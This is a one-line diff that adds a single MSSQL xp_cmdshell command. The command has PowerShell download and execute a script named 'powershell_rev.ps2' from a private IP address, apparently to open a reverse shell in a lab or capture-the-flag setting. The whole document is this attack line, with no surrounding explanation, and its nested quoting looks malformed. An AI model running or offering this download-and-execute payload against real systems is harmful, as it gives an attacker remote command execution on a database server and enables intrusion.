@@ -1,0 +1,1 @@
+xp_cmdshell "powershell "iex (New-Object Net.WebClient).DownloadString(\"http://10.10.14.4:8000/powershell_rev.ps2\")""
